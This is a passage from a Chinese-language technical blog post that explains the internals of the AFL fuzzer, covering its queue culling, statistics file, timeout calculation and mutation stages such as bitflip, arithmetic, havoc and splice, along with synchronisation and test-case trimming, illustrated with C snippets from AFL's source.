7))</code>与上面的差不多，中间的或运算改成了与，是为了检查该位是不是0，即判断该path对应的bit有没有被置位。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li>如果<code>top_rated[i]</code>有值，且该path在temp_v里被置位<ul><li>就从temp_v中清除掉所有<code>top_rated[i]</code>覆盖到的path，将对应的bit置为0</li><li>设置<code>top_rated[i]-&gt;favored</code>为1，queued_favored计数器加一</li><li>如果<code>top_rated[i]</code>的was_fuzzed字段是0，代表其还没有fuzz过，则将pending_favored计数器加一</li></ul></li><li>遍历queue队列<ul><li>mark_as_redundant(q, !q-&gt;favored)<ul><li>也就是说，如果不是favored的case，就被标记成redundant_edges</li></ul></li></ul></li></ul></li></ul><h4 id="mark-as-redundant-struct-queue-entry-q-u8-state"><a href="#mark-as-redundant-struct-queue-entry-q-u8-state" class="headerlink" title="mark_as_redundant(struct queue_entry *q, u8 state)"></a>mark_as_redundant(struct queue_entry *q, u8 state)</h4><ul><li>如果<code>state和q-&gt;fs_redundant</code>相等，就直接返回</li><li>设置<code>q-&gt;fs_redundant</code>的值为state，</li><li>如果state为1<ul><li>尝试创建<code>out_dir/queue/.state/redundant_edges/fname</code></li></ul></li><li>如果state为0<ul><li>尝试删除<code>out_dir/queue/.state/redundant_edges/fname</code></li></ul></li></ul><h4 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h4><p>在处理输入目录的末尾显示统计信息，以及一堆警告,以及几个硬编码的常量。</p><ul><li>依据之前从calibrate_case里得到的total_cal_us和total_cal_cycles，计算出单轮执行的时间avg_us，如果大于10000，就警告<code>&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</code><ul><li>如果avg_us大于50000，设置havoc_div为10 /* 0-19 execs/sec   */</li><li>大于20000，设置havoc_div为5 /* 20-49 execs/sec  */</li><li>如果大于10000，设置havoc_div为2 /* 50-100 execs/sec */</li></ul></li><li>如果不是resuming session，则对queue的大小和个数超限提出警告，且如果useless_at_start不为0，就警告有可以精简的样本。</li><li>如果timeout_given为0，则根据avg_us来计算出exec_tmout，<strong>注意这里avg_us的单位是微秒，而exec_tmout单位是毫秒，所以需要除以1000</strong><ul><li>avg_us &gt; 50000<ul><li>exec_tmout = avg_us * 2 / 1000</li></ul></li><li>avg_us &gt; 10000<ul><li>exec_tmout = avg_us * 3 / 1000</li></ul></li><li>exec_tmout = avg_us * 5 / 1000</li><li>然后在上面计算出来的exec_tmout和所有样例中执行时间最长的样例进行比较，取最大值赋给exec_tmout</li><li>如果exec_tmout大于EXEC_TIMEOUT，就设置exec_tmout = EXEC_TIMEOUT<ul><li>EXEC_TIMEOUT的值为1秒，即最大超时时间是1秒</li></ul></li><li>打印出<code>&quot;No -t option specified, so I&#39;ll use exec timeout of %u ms.&quot;, exec_tmout</code></li><li>设置timeout_given为1</li></ul></li><li>如果timeout_give不为0，且为3，代表这是resuming session，直接打印<code>&quot;Applying timeout settings from resumed session (%u ms).&quot;, exec_tmout</code>,此时的timeout_give是我们从历史记录里读取出的。</li><li>如果是dumb_mode且没有设置环境变量AFL_HANG_TMOUT<ul><li>设置hang_tmout为EXEC_TIMEOUT和<code>exec_tmout * 2 + 100</code>中的最小值</li></ul></li><li><code>All set and ready to roll!</code></li></ul><h4 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h4><p>resume时,请尝试查找要从其开始的队列位置,这仅在resume时以及当我们可以找到原始的fuzzer_stats时才有意义.</p><ul><li>如果不是resuming_fuzz，就直接返回</li><li>如果是in_place_resume,就打开<code>out_dir/fuzzer_stats</code>文件，否则打开<code>in_dir/../fuzzer_stats</code>文件</li><li>读这个文件的内容到tmp[4096]中，找到<code>cur_path</code>，并设置为ret的值，如果大于queued_paths就设置ret为0，返回ret。</li></ul><h4 id="void-write-stats-file-double-bitmap-cvg-double-stability-double-eps"><a href="#void-write-stats-file-double-bitmap-cvg-double-stability-double-eps" class="headerlink" title="void write_stats_file(double bitmap_cvg, double stability, double eps)"></a>void write_stats_file(double bitmap_cvg, double stability, double eps)</h4><p>更新统计信息文件以进行无人值守的监视</p><ul><li>创建文件<code>out_dir/fuzzer_stats</code></li><li>写入统计信息</li><li>start_time<ul><li>fuzz运行的开始时间，start_time / 1000</li></ul></li><li>last_update<ul><li>当前时间</li></ul></li><li>fuzzer_pid<ul><li>获取当前pid</li></ul></li><li>cycles_done<ul><li><code>queue_cycle</code>在<code>queue_cur</code>为空，即执行到当前队列尾的时候才增加1，所以这代表queue队列被完全变异一次的次数。</li></ul></li><li>execs_done<ul><li>total_execs，target的总的执行次数，每次<code>run_target</code>的时候会增加1</li></ul></li><li>execs_per_sec<ul><li>每秒执行的次数</li></ul></li><li>paths_total<ul><li>queued_paths在每次<code>add_to_queue</code>的时候会增加1，代表queue里的样例总数</li></ul></li><li>paths_favored<ul><li>queued_favored，有价值的路径总数</li></ul></li><li>paths_found<ul><li>queued_discovered在每次<code>common_fuzz_stuff</code>去执行一次fuzz时，发现新的interesting case的时候会增加1，代表在fuzz运行期间发现的新queue entry。</li></ul></li><li>paths_imported<ul><li>queued_imported是master-slave模式下，如果sync过来的case是interesting的，就增加1</li></ul></li><li>max_depth<ul><li>最大路径深度</li></ul></li><li>cur_path<ul><li>current_entry一般情况下代表的是正在执行的queue entry的整数ID,queue首节点的ID是0</li></ul></li><li>pending_favs<ul><li>pending_favored 等待fuzz的favored paths数</li></ul></li><li>pending_total<ul><li>pending_not_fuzzed 在queue中等待fuzz的case数</li></ul></li><li>variable_paths<ul><li>queued_variable在<code>calibrate_case</code>去评估一个新的test case的时候，如果发现这个case的路径是可变的，则将这个计数器加一，代表发现了一个可变case</li></ul></li><li>stability</li><li>bitmap_cvg</li><li>unique_crashes<ul><li>unique_crashes这是在<code>save_if_interesting</code>时，如果fault是FAULT_CRASH，就将unique_crashes计数器加一</li></ul></li><li>unique_hangs<ul><li>unique_hangs这是在<code>save_if_interesting</code>时，如果fault是FAULT_TMOUT，且exec_tmout小于hang_tmout，就以hang_tmout为超时时间再执行一次，如果还超时，就让hang计数器加一。</li></ul></li><li>last_path<ul><li>在<code>add_to_queue</code>里将一个新case加入queue时，就设置一次last_path_time为当前时间，<code>last_path_time / 1000</code></li></ul></li><li>last_crash<ul><li>同上，在unique_crashes加一的时候，last_crash也更新时间，<code>last_crash_time / 1000</code></li></ul></li><li>last_hang<ul><li>同上，在unique_hangs加一的时候，last_hang也更新时间，<code>last_hang_time / 1000</code></li></ul></li><li>execs_since_crash<ul><li>total_execs - last_crash_execs,这里last_crash_execs是在上一次crash的时候的总计执行了多少次</li></ul></li><li>exec_tmout<ul><li>配置好的超时时间，有三种可能的配置方式，见上文</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"start_time        : %llu\n"</span></span><br><span class="line">           <span class="string">"last_update       : %llu\n"</span></span><br><span class="line">           <span class="string">"fuzzer_pid        : %u\n"</span></span><br><span class="line">           <span class="string">"cycles_done       : %llu\n"</span></span><br><span class="line">           <span class="string">"execs_done        : %llu\n"</span></span><br><span class="line">           <span class="string">"execs_per_sec     : %0.02f\n"</span></span><br><span class="line">           <span class="string">"paths_total       : %u\n"</span></span><br><span class="line">           <span class="string">"paths_favored     : %u\n"</span></span><br><span class="line">           <span class="string">"paths_found       : %u\n"</span></span><br><span class="line">           <span class="string">"paths_imported    : %u\n"</span></span><br><span class="line">           <span class="string">"max_depth         : %u\n"</span></span><br><span class="line">           <span class="string">"cur_path          : %u\n"</span> <span class="comment">/* Must match find_start_position() */</span></span><br><span class="line">           <span class="string">"pending_favs      : %u\n"</span></span><br><span class="line">           <span class="string">"pending_total     : %u\n"</span></span><br><span class="line">           <span class="string">"variable_paths    : %u\n"</span></span><br><span class="line">           <span class="string">"stability         : %0.02f%%\n"</span></span><br><span class="line">           <span class="string">"bitmap_cvg        : %0.02f%%\n"</span></span><br><span class="line">           <span class="string">"unique_crashes    : %llu\n"</span></span><br><span class="line">           <span class="string">"unique_hangs      : %llu\n"</span></span><br><span class="line">           <span class="string">"last_path         : %llu\n"</span></span><br><span class="line">           <span class="string">"last_crash        : %llu\n"</span></span><br><span class="line">           <span class="string">"last_hang         : %llu\n"</span></span><br><span class="line">           <span class="string">"execs_since_crash : %llu\n"</span></span><br><span class="line">           <span class="string">"exec_timeout      : %u\n"</span> <span class="comment">/* Must match find_timeout() */</span></span><br><span class="line">           <span class="string">"afl_banner        : %s\n"</span></span><br><span class="line">           <span class="string">"afl_version       : "</span> VERSION <span class="string">"\n"</span></span><br><span class="line">           <span class="string">"target_mode       : %s%s%s%s%s%s%s\n"</span></span><br><span class="line">           <span class="string">"command_line      : %s\n"</span></span><br><span class="line">           <span class="string">"slowest_exec_ms   : %llu\n"</span>,</span><br><span class="line">        start_time / <span class="number">1000</span>, get_cur_time() / <span class="number">1000</span>, getpid(),</span><br><span class="line">        queue_cycle ? (queue_cycle - <span class="number">1</span>) : <span class="number">0</span>, total_execs, eps,</span><br><span class="line">        queued_paths, queued_favored, queued_discovered, queued_imported,</span><br><span class="line">        max_depth, current_entry, pending_favored, pending_not_fuzzed,</span><br><span class="line">        queued_variable, stability, bitmap_cvg, unique_crashes,</span><br><span class="line">        unique_hangs, last_path_time / <span class="number">1000</span>, last_crash_time / <span class="number">1000</span>,</span><br><span class="line">        last_hang_time / <span class="number">1000</span>, total_execs - last_crash_execs,</span><br><span class="line">        exec_tmout, use_banner,</span><br><span class="line">        qemu_mode ? <span class="string">"qemu "</span> : <span class="string">""</span>, dumb_mode ? <span class="string">" dumb "</span> : <span class="string">""</span>,</span><br><span class="line">        no_forkserver ? <span class="string">"no_forksrv "</span> : <span class="string">""</span>, crash_mode ? <span class="string">"crash "</span> : <span class="string">""</span>,</span><br><span class="line">        persistent_mode ? <span class="string">"persistent "</span> : <span class="string">""</span>, deferred_mode ? <span class="string">"deferred "</span> : <span class="string">""</span>,</span><br><span class="line">        (qemu_mode || dumb_mode || no_forkserver || crash_mode ||</span><br><span class="line">         persistent_mode || deferred_mode) ? <span class="string">""</span> : <span class="string">"default"</span>,</span><br><span class="line">        orig_cmdline, slowest_exec_ms);</span><br></pre></td></tr></table></figure><ul><li>统计子进程的资源用量并写入。</li></ul><h4 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h4><p>保存自动生成的extras</p><ul><li>如果auto_changed为0，则直接返回</li><li>如果不为0，就设置为0，然后创建名为<code>alloc_printf(&quot;%s/queue/.state/auto_extras/auto_%06u&quot;, out_dir, i);</code>的文件，并写入a_extras的内容。</li></ul><h3 id="Fuzz执行"><a href="#Fuzz执行" class="headerlink" title="Fuzz执行"></a>Fuzz执行</h3><h4 id="主循环"><a href="#主循环" class="headerlink" title="主循环"></a>主循环</h4><ul><li>首先精简队列<code>cull_queue</code></li><li>然后如果<code>queue_cur</code>为空，代表所有queue都被执行完一轮<ul><li>设置queue_cycle计数器加一，即代表所有queue被完整执行了多少轮。</li><li>设置current_entry为0，和queue_cur为queue首元素，开始新一轮fuzz。</li><li>如果是resume fuzz情况，则先检查seek_to是否为空，如果不为空，就从seek_to指定的queue项开始执行。</li><li>刷新展示界面<code>show_stats</code></li><li>如果在一轮执行之后的queue里的case数，和执行之前一样，代表在完整的一轮执行里都没有发现任何一个新的case<ul><li>如果use_splicing为1，就设置cycles_wo_finds计数器加1</li><li>否则，设置use_splicing为1，代表我们接下来要通过splice重组queue里的case。</li></ul></li></ul></li><li>执行<code>skipped_fuzz = fuzz_one(use_argv)</code>来对queue_cur进行一次测试<ul><li>注意fuzz_one并不一定真的执行当前queue_cur，它是有一定策略的，如果不执行，就直接返回1，否则返回0</li></ul></li><li>如果skipped_fuzz为0，且存在sync_id<ul><li>sync_interval_cnt计数器加一，如果其结果是SYNC_INTERVAL(默认是5)的倍数，就进行一次sync</li></ul></li><li><code>queue_cur = queue_cur-&gt;next;current_entry++;</code>，开始测试下一个queue</li></ul><h4 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h4><ul><li><p>如果<code>pending_favored</code>不为0，则对于queue_cur被fuzz过或者不是favored的，有99%的几率直接返回1。</p></li><li><p>如果<code>pending_favored</code>为0且queued_paths(即queue里的case总数)大于10</p><ul><li>如果queue_cycle大于1且queue_cur没有被fuzz过，则有75%的概率直接返回1</li><li>如果queue_cur被fuzz过，否则有95%的概率直接返回1</li></ul></li><li><p>设置len为<code>queue_cur-&gt;len</code></p></li><li><p>打开该case对应的文件，并通过mmap映射到内存里，地址赋值给<code>in_buf</code>和<code>orig_in</code></p></li><li><p>分配len大小的内存，并初始化为全0，然后将地址赋值给out_buf</p></li><li><p><strong>CALIBRATION阶段</strong></p></li><li><p>假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case再次校准。</p></li><li><p><strong>TRIMMING阶段</strong></p></li><li><p>如果该case没有trim过，</p><ul><li>调用函数<code>trim_case(argv, queue_cur, in_buf)</code>进行trim(修剪)</li><li>设置queue_cur的trim_done为1</li><li>重新读取一次<code>queue_cur-&gt;len</code>到len中</li></ul></li><li><p>将in_buf拷贝len个字节到out_buf中</p></li><li><p><strong>PERFORMANCE SCORE阶段</strong></p></li><li><p>perf_score = <code>calculate_score(queue_cur)</code></p></li><li><p>如果skip_deterministic为1，或者queue_cur被fuzz过，或者queue_cur的passed_det为1，则跳转去havoc_stage阶段</p></li><li><p>设置doing_det为1</p></li><li><p><strong>SIMPLE BITFLIP (+dictionary construction)阶段</strong></p></li><li><p>下面这个宏很有意思</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line">    u8* _arf = (u8*)(_ar); \</span><br><span class="line">    u32 _bf = (_b); \</span><br><span class="line">    _arf[(_bf) &gt;&gt; <span class="number">3</span>] ^= (<span class="number">128</span> &gt;&gt; ((_bf) &amp; <span class="number">7</span>)); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>设置stage_name为<code>bitflip 1/1</code>,_ar的取值是out_buf,而_bf的取值在[0: len &lt;&lt; 3)<br>所以用<code>_bf &amp; 7</code>能够得到<code>0,1,2...7 0,1,2...7</code>这样的取值一共len组，然后<code>(_bf) &gt;&gt; 3</code>又将[0: len&lt;&lt;3)映射回了[0: len)，对应到buf里的每个byte，如图:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-27-023812.jpg" alt=""><br>所以在从<code>0-len*8</code>的遍历过程中会通过亦或运算，依次将每个位翻转，然后执行一次<code>common_fuzz_stuff</code>，然后再翻转回来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stage_max = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">&#123;</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。<br>比如对于SQL的<code>SELECT *</code>，如果<code>SELECT</code>被破坏，则肯定和正确的路径不一致，而被破坏之后的路径却肯定是一样的，比如<code>AELECT</code>和<code>SBLECT</code>，显然都是无意义的，而只有不破坏token，才有可能出现和原始执行路径一样的结果，所以AFL在这里就是在猜解关键字token。</p></li><li><p>token默认最小是3，最大是32,每次发现新token时，通过<code>maybe_add_auto</code>添加到<code>a_extras</code>数组里。</p></li><li><p><code>stage_finds[STAGE_FLIP1]</code>的值加上在整个FLIP_BIT中新发现的路径和Crash总和</p></li><li><p><code>stage_cycles[STAGE_FLIP1]</code>的值加上在整个FLIP_BIT中执行的target次数<code>stage_max</code></p></li><li><p>设置stage_name为<code>bitflip 2/1</code>,原理和之前一样，只是这次是连续翻转相邻的两位。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stage_max = (len &lt;&lt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">&#123;</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后保存结果到<code>stage_finds[STAGE_FLIP2]和stage_cycles[STAGE_FLIP2]</code>里。</p></li><li><p>同理，设置stage_name为<code>bitflip 4/1</code>，翻转连续的四位并记录。</p></li><li><p>生成effector map</p><ul><li>在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。</li><li>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</li><li>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</li><li>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。</li><li>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关：</li></ul></li><li><p>设置stage_name为<code>bitflip 8/8</code>，以字节为单位，直接通过和<code>0xff</code>亦或运算去翻转整个字节的位，然后执行一次，并记录。</p></li><li><p>设置stage_name为<code>bitflip 16/8</code>，设置<code>stage_max</code>为<code>len - 1</code>，以字为单位和<code>0xffff</code>进行亦或运算，去翻转相邻的两个字节(即一个字的)的位。</p><ul><li>这里要注意在翻转之前会先检查eff_map里对应于这两个字节的标志是否为0，如果为0，则这两个字节是无效的数据，stage_max减一，然后开始变异下一个字。</li><li>common_fuzz_stuff执行变异后的结果，然后还原。</li></ul></li><li><p>同理，设置stage_name为<code>bitflip 32/8</code>，然后设置<code>stage_max</code>为<code>len - 3</code>，以双字为单位，直接通过和<code>0xffffffff</code>亦或运算去相邻四个字节的位，然后执行一次，并记录。</p><ul><li>在每次翻转之前会检查eff_map里对应于这四个字节的标志是否为0，如果是0，则这两个字节是无效的数据，stage_max减一，然后开始变异下一组双字。</li></ul></li><li><p><strong>ARITHMETIC INC/DEC</strong></p></li><li><p>在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段：</p></li><li><p>arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</p></li><li><p>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</p></li><li><p>arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</p></li><li><p>加减变异的上限，在config.h中的宏ARITH_MAX定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。</p></li><li><p>此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p></li><li><p><strong>INTERESTING VALUES</strong></p></li><li><p>下一个阶段是interest，具体可分为：</p></li><li><p>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</p></li><li><p>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</p></li><li><p>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</p></li><li><p>而用于替换的”interesting values”，是AFL预设的一些比较特殊的数,这些数的定义在config.h文件中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> s8  interesting_8[]  = &#123; INTERESTING_8 &#125;;</span><br><span class="line"><span class="keyword">static</span> s16 interesting_16[] = &#123; INTERESTING_8, INTERESTING_16 &#125;;</span><br><span class="line"><span class="keyword">static</span> s32 interesting_32[] = &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;;</span><br></pre></td></tr></table></figure></li><li><p>与之前类似，effector map仍然会用于判断是否需要变异；此外，如果某个interesting value，是可以通过bitflip或者arithmetic变异达到，那么这样的重复性变异也是会跳过的。</p></li><li><p><strong>DICTIONARY STUFF</strong><br>进入到这个阶段，就接近deterministic fuzzing的尾声了。具体有以下子阶段：</p></li><li><p>user extras(over),从头开始,将用户提供的tokens依次替换到原文件中,stage_max为<code>extras_cnt * len</code></p></li><li><p>user extras(insert),从头开始,将用户提供的tokens依次插入到原文件中,stage_max为<code>extras_cnt * len</code></p></li><li><p>auto extras(over),从头开始,将自动检测的tokens依次替换到原文件中,stage_max为<code>MIN(a_extras_cnt, USE_AUTO_EXTRAS) * len</code></p></li><li><p>其中，用户提供的tokens，是在词典文件中设置并通过-x选项指定的，如果没有则跳过相应的子阶段。</p></li><li><p><strong>RANDOM HAVOC</strong></p></li><li><p>对于非dumb mode的主fuzzer来说，完成了上述deterministic fuzzing后，便进入了充满随机性的这一阶段；对于dumb mode或者从fuzzer来说，则是直接从这一阶段开始。</p></li><li><p>havoc，顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p></li><li><p>随机选取某个bit进行翻转</p></li><li><p>随机选取某个byte，将其设置为随机的interesting value</p></li><li><p>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</p></li><li><p>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</p></li><li><p>随机选取某个byte，对其减去一个随机数</p></li><li><p>随机选取某个byte，对其加上一个随机数</p></li><li><p>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</p></li><li><p>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</p></li><li><p>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</p></li><li><p>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</p></li><li><p>随机选取某个byte，将其设置为随机数</p></li><li><p>随机删除一段bytes</p></li><li><p>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</p></li><li><p>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</p></li><li><p>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</p></li><li><p>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</p></li><li><p>怎么样，看完上面这么多的“随机”，有没有觉得晕？还没完，AFL会生成一个随机数，作为变异组合的数量，并根据这个数量，每次从上面那些方式中随机选取一个（可以参考高中数学的有放回摸球），依次作用到文件上。如此这般丧心病狂的变异，原文件就大概率面目全非了，而这么多的随机性，也就成了fuzzing过程中的不可控因素，即所谓的“看天吃饭”了。</p></li><li><p>splice</p></li><li><p>设置ret_val的值为0</p></li><li><p>如果queue_cur通过了评估，且was_fuzzed字段是0，就设置<code>queue_cur-&gt;was_fuzzed</code>为1，然后pending_not_fuzzed计数器减一</p></li><li><p>如果queue_cur是favored, pending_favored计数器减一。</p><h4 id="sync-fuzzers-char-argv"><a href="#sync-fuzzers-char-argv" class="headerlink" title="sync_fuzzers(char **argv)"></a>sync_fuzzers(char **argv)</h4><p>这个函数其实就是读取其他sync文件夹下的queue文件，然后保存到自己的queue里。</p></li><li><p>打开<code>sync_dir</code>文件夹</p></li><li><p>while循环读取该文件夹下的目录和文件<code>while ((sd_ent = readdir(sd)))</code></p><ul><li>跳过<code>.</code>开头的文件和<code>sync_id</code>即我们自己的输出文件夹</li><li>读取<code>out_dir/.synced/sd_ent-&gt;d_name</code>文件即<code>id_fd</code>里的前4个字节到<code>min_accept</code>里，设置<code>next_min_accept</code>为<code>min_accept</code>，这个值代表之前从这个文件夹里读取到的最后一个queue的id。</li><li>设置stage_name为<code>sprintf(stage_tmp, &quot;sync %u&quot;, ++sync_cnt);</code>，设置stage_cur为0，stage_max为0</li><li>循环读取<code>sync_dir/sd_ent-&gt;d_name/queue</code>文件夹里的目录和文件<ul><li>同样跳过<code>.</code>开头的文件和标识小于min_accept的文件，因为这些文件应该已经被sync过了。</li><li>如果标识<code>syncing_case</code>大于等于next_min_accept，就设置next_min_accept为<code>syncing_case + 1</code></li><li>开始同步这个case<ul><li>如果case大小为0或者大于MAX_FILE(默认是1M),就不进行sync。</li><li>否则mmap这个文件到内存mem里，然后<code>write_to_testcase(mem, st.st_size)</code>,并run_target,然后通过save_if_interesting来决定是否要导入这个文件到自己的queue里，如果发现了新的path，就导入。<ul><li>设置syncing_party的值为<code>sd_ent-&gt;d_name</code></li><li>如果save_if_interesting返回1，queued_imported计数器就加1</li></ul></li></ul></li><li>stage_cur计数器加一，如果stage_cur是stats_update_freq的倍数，就刷新一次展示界面。</li></ul></li><li>向id_fd写入当前的<code>next_min_accept</code>值</li></ul></li><li><p>总结来说，这个函数就是先读取有哪些fuzzer文件夹，然后读取其他fuzzer文件夹下的queue文件夹里的case，并依次执行，如果发现了新path，就保存到自己的queue文件夹里，而且将最后一个sync的case id写入到<code>.synced/其他fuzzer文件夹名</code>文件里，以避免重复运行。</p></li></ul><h4 id="trim-case-char-argv-struct-queue-entry-q-u8-in-buf"><a href="#trim-case-char-argv-struct-queue-entry-q-u8-in-buf" class="headerlink" title="trim_case(char **argv, struct queue_entry *q, u8 *in_buf)"></a>trim_case(char **argv, struct queue_entry *q, u8 *in_buf)</h4><ul><li>如果这个case的大小len小于5字节，就直接返回</li><li>设置stage_name的值为tmp，在bytes_trim_in的值里加上len，bytes_trim_in代表被trim过的字节数</li><li>计算len_p2，其值是大于等于q-&gt;len的第一个2的幂次。（eg.如果len是5704,那么len_p2就是8192）</li><li>取<code>len_p2的1/16</code>为remove_len，这是起始步长。</li><li>进入while循环，终止条件是remove_len小于终止步长<code>len_p2的1/1024</code>,<strong>每轮循环步长会除2.</strong><ul><li>设置remove_pos的值为remove_len</li><li>读入<code>&quot;trim %s/%s&quot;, DI(remove_len), DI(remove_len)</code>到tmp中, 即stage_name = “trim 512/512”</li><li>设置stage_cur为0，stage_max为<code>q-&gt;len / remove_len</code></li><li>进入while循环，<code>remove_pos &lt; 